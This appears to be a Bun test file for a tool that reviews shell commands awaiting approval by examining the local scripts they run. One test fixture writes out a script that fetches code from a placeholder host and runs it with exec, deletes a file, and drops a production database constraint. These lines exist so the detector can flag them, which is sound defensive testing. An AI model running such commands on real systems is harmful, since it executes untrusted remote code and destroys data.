import { afterEach, describe, expect, test } from "bun:test"
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { enrichLocalScriptEvidence } from "../src/local-script-evidence.ts"
import { request } from "./helpers.ts"

const temporaryDirectories: string[] = []

async function fixture(): Promise<string> {
  const directory = await mkdtemp(join(tmpdir(), "approval-reviewer-local-script-"))
  temporaryDirectories.push(directory)
  return directory
}

afterEach(async () => {
  await Promise.all(temporaryDirectories.splice(0).map((directory) => rm(directory, { recursive: true })))
})

describe("local script evidence enrichment", () => {
  test("includes a script executed after environment activation", async () => {
    const directory = await fixture()
    const script = join(directory, "consolidate.py")
    await writeFile(script, 'print("bounded local script")\n')
    const command = `source /opt/conda.sh && conda activate app && python3 ${script}`
    const result = await enrichLocalScriptEvidence(
      request({ patterns: [command], metadata: { command } }),
      directory,
      directory,
      12_000,
    )
    expect(result.text).toContain("LOCAL_SCRIPT_ANALYSIS")
    expect(result.text).toContain('"interpreter": "python3"')
    expect(result.text).toContain('"status": "included"')
    expect(result.text).toContain("bounded local script")
  })

  test("resolves relative scripts after a successful cd", async () => {
    const directory = await fixture()
    const project = join(directory, "project")
    await mkdir(project)
    await writeFile(join(project, "task.py"), 'print("resolved after cd")\n')
    const command = `cd ${project} && python3 task.py`
    const result = await enrichLocalScriptEvidence(
      request({ patterns: [command], metadata: { command } }),
      directory,
      directory,
      12_000,
    )
    expect(result.text).toContain("resolved after cd")
    expect(result.text).toContain(join(project, "task.py"))
  })

  test("surfaces local filesystem, database, URL, and dynamic execution signals", async () => {
    const directory = await fixture()
    const script = join(directory, "mutate.py")
    await writeFile(
      script,
      [
        "from pathlib import Path",
        "import urllib.request",
        'Path("guide.md").write_text("replacement")',
        'Path("old.pdf").unlink()',
        'payload = urllib.request.urlopen("https://odd.invalid/code.py").read()',
        'exec(compile(payload, "<download>", "exec"))',
        'sql = "ALTER TABLE production DROP CONSTRAINT important"',
      ].join("\n"),
    )
    const command = `python ${script}`
    const result = await enrichLocalScriptEvidence(
      request({ patterns: [command], metadata: { command } }),
      directory,
      directory,
      24_000,
    )
    expect(result.text).toContain('"fileMutationHint": true')
    expect(result.text).toContain('"databaseMutationHint": true')
    expect(result.text).toContain('"dynamicExecutionHint": true')
    expect(result.text).toContain("https://odd.invalid/code.py")
  })

  test("does not mistake inline code, modules, or remote SSH arguments for local scripts", async () => {
    const directory = await fixture()
    for (const command of [
      'python -c "print(1)"',
      "python -m pytest",
      "bun test tests/runtime.test.ts",
      "ssh host 'python /tmp/remote.py'",
    ]) {
      const result = await enrichLocalScriptEvidence(
        request({ patterns: [command], metadata: { command } }),
        directory,
        directory,
        8_000,
      )
      expect(result.text).toBe("")
    }
  })

  test("reports a missing local script but does not make a decision", async () => {
    const directory = await fixture()
    const command = `python3 ${join(directory, "missing.py")}`
    const result = await enrichLocalScriptEvidence(
      request({ patterns: [command], metadata: { command } }),
      directory,
      directory,
      8_000,
    )
    expect(result.text).toContain('"status": "unavailable"')
    expect(result.text).toContain("ENOENT")
  })
})
